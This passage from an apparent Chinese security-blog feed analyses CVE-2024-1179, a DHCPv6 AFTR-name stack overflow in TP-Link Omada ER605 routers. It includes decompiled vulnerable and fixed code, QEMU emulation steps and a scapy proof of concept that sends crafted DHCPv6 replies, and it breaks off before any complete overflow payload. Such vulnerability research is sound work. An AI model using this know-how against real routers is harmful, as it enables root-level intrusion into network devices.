class="keyword">else</span></span><br><span class="line">          v7 = <span class="built_in">sub_5C71F0</span>(v6, v6);</span><br><span class="line">LABEL_22:</span><br><span class="line">        <span class="built_in">sub_5C74F0</span>(v7);</span><br><span class="line">LABEL_23:</span><br><span class="line">        <span class="built_in">LOBYTE</span>(v19) = <span class="number">1</span>;</span><br><span class="line">        v12 = Source - <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span> ( _InterlockedDecrement(Source - <span class="number">1</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">          (*(**v12 + <span class="number">4</span>))(v12);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">101</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = v16;</span><br><span class="line">    <span class="keyword">if</span> ( v16 || (<span class="built_in">sub_646D00</span>(v15), (v8 = v16) != <span class="number">0</span>) )</span><br><span class="line">    {</span><br><span class="line">      v9 = v8 - <span class="number">116</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">sub_44A540</span>(&amp;Source, *(v9 + <span class="number">144</span>));</span><br><span class="line">        <span class="built_in">LOBYTE</span>(v19) = <span class="number">5</span>;</span><br><span class="line">        v10 = dword_CF1C14;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_CF1C14 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          v11 = v10[<span class="number">2</span>];</span><br><span class="line">          v10 = *v10;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">sub_44E730</span>(&amp;Source, v11) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v10 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> ( !v11 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">        <span class="built_in">sub_5CE090</span>(v11 + <span class="number">520</span>);</span><br><span class="line">        <span class="built_in">sub_90A3AA</span>(<span class="keyword">this</span>, <span class="number">1301</span>);</span><br><span class="line">        v7 = <span class="built_in">sub_5C7650</span>(v11);</span><br><span class="line">        <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  v19 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_646C50</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里省去了一些GUI代码逻辑，经过分析之后发现这个洞（bug）非常鸡肋，是由wcscpy_s的函数实现所产生的</p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h2&gt;&lt;p&gt;GOM Player（Gretech Online Movie Player）是韩国的GR</summary>
      
    
    
    
    <category term="Poc" scheme="https://www.z1r0.top/categories/Poc/"/>
    
    
    <category term="RW" scheme="https://www.z1r0.top/tags/RW/"/>
    
  </entry>
  
  <entry>
    <title>Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605</title>
    <link href="https://www.z1r0.top/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/"/>
    <id>https://www.z1r0.top/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/</id>
    <published>2024-03-22T12:05:30.000Z</published>
    <updated>2024-04-02T06:19:21.198Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="Pwn2Own-TORONTO-2023-CVE-2024-1179-amp-TP-Link-Omada-ER605"><a href="#Pwn2Own-TORONTO-2023-CVE-2024-1179-amp-TP-Link-Omada-ER605" class="headerlink" title="Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"></a>Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605</h1><blockquote><p>该漏洞在<a href="https://www.zerodayinitiative.com/advisories/ZDI-24-085/">Pwn2Own</a>中被利用</p><table><thead><tr><th>CVE ID</th><th><a href="https://www.cve.org/CVERecord?id=CVE-2024-1179">CVE-2024-1179</a></th></tr></thead><tbody><tr><td>CVSS SCORE</td><td>7.5, <a href="http://nvd.nist.gov/cvss.cfm?calculator&amp;version=3.0&amp;vector=AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H">AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H</a></td></tr><tr><td>AFFECTED VENDORS</td><td>TP-Link</td></tr><tr><td>AFFECTED PRODUCTS</td><td><a href="https://www.tp-link.com/us/business-networking/omada-sdn-router/er605/">Omada ER605</a></td></tr><tr><td>VULNERABILITY DETAILS</td><td>This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link Omada ER605 routers. Authentication is not required to exploit this vulnerability.The specific flaw exists within the handling of DHCP options. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root.</td></tr><tr><td>ADDITIONAL DETAILS</td><td>Fixed in firmware: ER605(UN)_V2_2.2.4 Build 20240119</td></tr></tbody></table></blockquote><h2 id="介绍-amp-固件下载"><a href="#介绍-amp-固件下载" class="headerlink" title="介绍&amp;固件下载"></a>介绍&amp;固件下载</h2><p>由于对dhcpv6的不熟悉，一开始在做漏洞分析的时候有个问题困扰了我，有dhcp6s这个服务端的存在，为什么漏洞点在client端，而且client端会挂载到546这个端口上，在经过学习了解后知道了client会接收server发送的确认报文</p><p>所以漏洞点都能猜到是在处理接收报文时发生的</p><p><img src="/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/2.png" alt="1"></p><p>修复固件：<a href="https://static.tp-link.com/upload/firmware/2024/202401/20240124/ER605(UN)_v2_2.2.4%20Build%2020240119.zip">下载链接</a></p><p>漏洞固件：<a href="https://static.tp-link.com/upload/firmware/2023/202312/20231221/ER605(UN)_v2_2.2.3%20Build%2020231201.zip">下载链接</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>将Fix版本和漏洞版本进行diff，根据漏洞描述，可以很快速的确认漏洞点在<code>dhcpv6-client</code>中，将<code>dhcpv6c</code>进行具体的diff，发现了一个函数内memest附近有被fix的情况，基本确定此文件为漏洞文件</p><p>这是一个发生在<code>dhcpv6 client</code>中的漏洞，而这个binary在网上有一部分公开的源码，<a href="https://github.com/garybuhrmaster/wide-dhcpv6/tree/main">下载链接</a>，借助这个源码来辅助分析大大减低了逆向工作量</p><p><code>0x405F08</code>这个函数中发现了关键fix</p><p><img src="/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/1.png" alt="1"></p><p>fix版本对case64这里的memcpy条件进行了限制</p><p>在处理aftr_name时，字符组合没有大小检查导致的溢出</p><p>这是漏洞版本</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">if</span> ( optlen )</span><br><span class="line">        {</span><br><span class="line">          v65 = (a3 + <span class="number">232</span>);</span><br><span class="line">          <span class="keyword">if</span> ( a3 != <span class="number">-232</span> )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( cp )</span><br><span class="line">            {</span><br><span class="line">              tlen = tlen[<span class="number">4</span>];</span><br><span class="line">              v64 = <span class="number">1</span>;</span><br><span class="line">              opt = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( tlen )</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span> ( optlen &lt; tlen )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="built_in">memcpy</span>(&amp;v65[opt], cp + v64, tlen);</span><br><span class="line">                v15 = &amp;tlen[v64];</span><br><span class="line">                <span class="keyword">if</span> ( &amp;tlen[v64] &gt;= optlen )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                v16 = &amp;tlen[opt];</span><br><span class="line">                v64 = (v15 + <span class="number">1</span>);</span><br><span class="line">                tlen = v15[cp];</span><br><span class="line">                opt = (v16 + <span class="number">1</span>);</span><br><span class="line">                v16[v65] = <span class="number">46</span>;</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure><p>这是fix版本</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !v62 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_110;</span><br><span class="line">        v66 = (<span class="type">const</span> <span class="type">char</span> *)(a3 + <span class="number">232</span>);</span><br><span class="line">        <span class="keyword">if</span> ( a3 == <span class="number">-232</span> || !cp )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_110;</span><br><span class="line">        size = (<span class="type">unsigned</span> __int8 *)(<span class="type">char</span>)size[<span class="number">4</span>];</span><br><span class="line">        v65 = <span class="number">1</span>;</span><br><span class="line">        opt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( !size )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_110;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">int</span>)size &lt; <span class="number">0</span> || v62 &lt; (<span class="type">int</span>)size || (<span class="type">int</span>)size &gt;= <span class="number">64</span> - opt )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">memcpy</span>(&amp;v66[opt], cp + v65, size);</span><br><span class="line">          v16 = (<span class="type">const</span> <span class="type">char</span> *)&amp;size[v65];</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">int</span>)&amp;size[v65] &gt;= v62 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_110;</span><br><span class="line">          v17 = &amp;size[opt];</span><br><span class="line">          v65 = (<span class="type">int</span>)(v16 + <span class="number">1</span>);</span><br><span class="line">          size = (<span class="type">unsigned</span> __int8 *)v16[cp];</span><br><span class="line">          opt = (<span class="type">int</span>)(v17 + <span class="number">1</span>);</span><br><span class="line">          v17[(_DWORD)v66] = <span class="number">46</span>;</span><br><span class="line">        }</span><br><span class="line">        sub_4043BC(<span class="number">6</span>, <span class="string">"getAftrName"</span>, <span class="string">"tlen is more than DHCP6_AFTRNAME_SIZE"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_110;</span><br></pre></td></tr></tbody></table></figure><h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>接下来需要编写Poc来触发此漏洞，这里的dhcpv6需要一些配置文件，所以采取qemu-system来模拟，搭建一个给qemu-system用的网络</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig ens32 down</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens32</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig ens32 0.0.0.0 promisc up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo brctl addif br0 tap0</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up</span><br><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mips_standard.qcow2 \</span><br><span class="line">    -append <span class="string">"root=/dev/sda1"</span> \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br><span class="line">bash run.sh</span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig eth0 192.168.10.200/24 up</span></span><br><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev</span><br><span class="line"><span class="built_in">chroot</span> ./squashfs-root/ sh</span><br></pre></td></tr></tbody></table></figure><p>发现并没有<code>/etc/init.d/rcS</code>，需要手动启动dhcp6c，<code>/etc/init.d/dhcp6c</code>这个也启动不了，改了一些东西总是失败</p><p>在启动前需要patch一个地方，将&lt;0改成&gt;=0，ida patch会失败，@cdm258帮我用010修改了，<code>0A 61 00 1A B8 65 00 65 00 1A 70 64 80 9A E2 67</code></p><p>patch前</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( setsockopt(sock, <span class="number">0xFFFF</span>, <span class="number">512</span>, &amp;v41, <span class="number">4</span>) &lt; <span class="number">0</span> )</span><br><span class="line">              {</span><br><span class="line">                v16 = _errno_location();</span><br><span class="line">                v17 = strerror(*v16);</span><br><span class="line">                v18 = <span class="string">"setsockopt(SO_REUSEPORT): %s"</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_66;</span><br><span class="line">              }</span><br></pre></td></tr></tbody></table></figure><p>patch后</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( setsockopt(sock, <span class="number">0xFFFF</span>, <span class="number">512</span>, &amp;v41, <span class="number">4</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">              {</span><br><span class="line">                v16 = _errno_location();</span><br><span class="line">                v17 = strerror(*v16);</span><br><span class="line">                v18 = <span class="string">"setsockopt(SO_REUSEPORT): %s"</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_66;</span><br><span class="line">              }</span><br></pre></td></tr></tbody></table></figure><p>接着用以下命令就可以启动dhcp6c了，dhcp6c正常挂载到了546端口上，这个dhcp6c.conf是手动创建的，里面空的（我后面觉得完全可以直接qemu-user来启动，因为不熟悉dhcpv6，走了很多弯路</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># /usr/sbin/dhcp6c -c /tmp/dhcp6c/dhcp6c.conf -Df eth0</span></span><br><span class="line">/ <span class="comment"># netstat -unap</span></span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">udp        0      0 0.0.0.0:54249           0.0.0.0:*                           1525/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:821             0.0.0.0:*                           1494/rpcbind</span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           2237/dhclient</span><br><span class="line">udp        0      0 127.0.0.1:853           0.0.0.0:*                           1525/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           1494/rpcbind</span><br><span class="line">udp        0      0 0.0.0.0:52945           0.0.0.0:*                           2237/dhclient</span><br><span class="line">udp        0      0 :::546                  :::*                                2380/dhcp6c</span><br><span class="line">udp        0      0 :::46377                :::*                                1525/rpc.statd</span><br><span class="line">udp        0      0 :::821                  :::*                                1494/rpcbind</span><br><span class="line">udp        0      0 :::61764                :::*                                2237/dhclient</span><br><span class="line">udp        0      0 :::111                  :::*                                1494/rpcbind</span><br></pre></td></tr></tbody></table></figure><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><p>这是第一份远程有响应的Poc，这里有@starrysky的帮助</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet6 <span class="keyword">import</span> IPv6, UDP</span><br><span class="line"><span class="keyword">from</span> scapy.layers.dhcp6 <span class="keyword">import</span> DHCP6_Reply, DHCP6OptServerId, DHCP6OptClientId</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'mips'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'192.168.10.200'</span></span><br><span class="line">port = <span class="number">546</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_dhcp6_reply_and_listen</span>(<span class="params">interface, src_ipv6, dst_ipv6, src_mac, dst_mac, transaction_id</span>):</span><br><span class="line">    <span class="comment"># 构造以太网层</span></span><br><span class="line">    ether_layer = Ether(src=src_mac, dst=dst_mac)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造IPv6层</span></span><br><span class="line">    ipv6_layer = IPv6(src=src_ipv6, dst=dst_ipv6)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造UDP层</span></span><br><span class="line">    udp_layer = UDP(sport=<span class="number">547</span>, dport=<span class="number">546</span>)  <span class="comment"># 注意端口号，服务器端是547，客户端是546</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造DHCPv6 REPLY消息</span></span><br><span class="line">    dhcp6_reply = DHCP6_Reply(trid=transaction_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造Server ID选项</span></span><br><span class="line">    server_id = DHCP6OptServerId(duid=DUID_LLT(hwtype=<span class="number">1</span>, lladdr=src_mac))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造Client ID选项</span></span><br><span class="line">    client_id = DHCP6OptClientId(duid=DUID_LLT(hwtype=<span class="number">1</span>, lladdr=dst_mac))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组合所有层</span></span><br><span class="line">    packet = ether_layer / ipv6_layer / udp_layer / dhcp6_reply / server_id / client_id</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送数据包</span></span><br><span class="line">    sendp(packet, iface=interface, verbose=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"DHCPv6 Reply消息已发送，等待响应..."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置监听过滤器，捕获DHCPv6 Solicit或Request等消息作为响应</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">filter_reply</span>(<span class="params">pkt</span>):</span><br><span class="line">        <span class="keyword">return</span> DHCP6_Reply <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[DHCP6_Reply].trid == transaction_id</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 监听网络上的回应，持续5秒</span></span><br><span class="line">    response = sniff(iface=interface, <span class="built_in">filter</span>=<span class="string">"udp and port 546"</span>, prn=<span class="keyword">lambda</span> x: x.show(),</span><br><span class="line">                     lfilter=filter_reply, timeout=<span class="number">5</span>, count=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断是否收到回应</span></span><br><span class="line">    <span class="keyword">if</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"成功接收到DHCPv6回应。"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"未收到DHCPv6回应。"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请根据你的具体环境调整以下参数</span></span><br><span class="line">interface_name = <span class="string">"br0"</span>  <span class="comment"># Linux中的网络接口名称</span></span><br><span class="line"><span class="comment">#source_ipv6 = "fe80::8df1:7906:7b33:58d7"  # 源IPv6地址</span></span><br><span class="line">source_ipv6 = <span class="string">"fe80::21c:42ff:fee0:61cf"</span>  <span class="comment"># 源IPv6地址</span></span><br><span class="line">destination_ipv6 = <span class="string">"fe80::216:3eff:fe00:1"</span>  <span class="comment"># 目的IPv6地址（虚拟机内的dhcp6c客户端IPv6地址）</span></span><br><span class="line">source_mac = <span class="string">"00:0c:29:b2:c1:98"</span>  <span class="comment"># 源MAC地址</span></span><br><span class="line">destination_mac = <span class="string">"00:16:3E:00:00:01"</span>  <span class="comment"># 目的MAC地址（虚拟机内的网络接口MAC地址）</span></span><br><span class="line"><span class="comment">#transaction_id = 0x00abcdef  # 事务ID</span></span><br><span class="line">transaction_id = <span class="number">0x25d6bd</span>  <span class="comment"># 事务ID</span></span><br><span class="line">getAftrName = <span class="string">"a"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送DHCPv6 ADVERTISE消息</span></span><br><span class="line">send_dhcp6_reply_and_listen(interface_name, source_ipv6, destination_ipv6, source_mac, destination_mac, transaction_id)</span><br></pre></td></tr></tbody></table></figure><p>远程响应</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Mar/28/2024 02:41:42: client6_recv: receive reply from fe80::21c:42ff:fee0:61cf%eth0 on eth0</span><br><span class="line">Mar/28/2024 02:41:42: dhcp6_get_options: get DHCP option server ID, len 14</span><br><span class="line">Mar/28/2024 02:41:42:   DUID: 00:01:00:01:00:00:00:00:00:0c:29:b2:c1:98</span><br><span class="line">Mar/28/2024 02:41:42: dhcp6_get_options: get DHCP option client ID, len 14</span><br><span class="line">Mar/28/2024 02:41:42:   DUID: 00:01:00:01:00:00:00:00:00:16:3e:00:00:01</span><br><span class="line">Mar/28/2024 02:41:42: client6_recvreply: XID mismatch</span><br></pre></td></tr></tbody></table></figure><p>这个case 64通过fix版本进行查看的时候可以发现是aftr_name，scapy里好像没有，所以udp重放了一下流量，拿到bytes类型的Poc，同时在qemu里tcpdump抓了一个包，通过流量包分析出了格式</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000  07 25 d6 bd 00 02 00 0e  00 01 00 01 00 00 00 00   .%...... ........</span><br><span class="line">00000010  00 0c 29 b2 c1 98 00 01  00 0e 00 01 00 01 00 00   ..)..... ........</span><br><span class="line">00000020  00 00 00 16 3e 00 00 01 </span><br></pre></td></tr></tbody></table></figure><p>0x07是<code>Message type</code>、0x25d6bd是<code>Transaction ID</code>、0x0002是<code>option</code>、0x0e是<code>Length</code>、0001000100000000000c29b2c198是<code>DUID</code></p><p>我们需要控制的是option和length以及后面option对应的数据，控制option为64，length为payload的长度，对应的数据存放payload，这个payload格式需要符合after_name的格式</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   0                   1                   2                   3</span><br><span class="line">   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">  +-------------------------------+-------------------------------+</span><br><span class="line">  |    OPTION_AFTR_NAME: 64       |          option-len           |</span><br><span class="line">  +-------------------------------+-------------------------------+</span><br><span class="line">  |                                                               |</span><br><span class="line">  |                  tunnel-endpoint-name (FQDN)                  |</span><br><span class="line">  |                                                               |</span><br><span class="line">  +---------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">      OPTION_AFTR_NAME: 64</span><br><span class="line"></span><br><span class="line">            option-len: Length of the tunnel-endpoint-name field in</span><br><span class="line">                        octets.</span><br><span class="line"></span><br><span class="line">  tunnel-endpoint-name: A fully qualified domain name of the AFTR</span><br><span class="line">                        tunnel endpoint.</span><br><span class="line"></span><br><span class="line">              Figure 1: AFTR-Name DHCPv6 Option Format</span><br><span class="line"></span><br><span class="line">The tunnel-endpoint-name field is formatted as required in DHCPv6</span><br><span class="line">[RFC3315] Section 8 ("Representation and Use of Domain Names").</span><br><span class="line">Briefly, the format described is using a single octet noting the</span><br><span class="line">length of one DNS label (limited to at most 63 octets), followed by</span><br><span class="line">the label contents.  This repeats until all labels in the FQDN 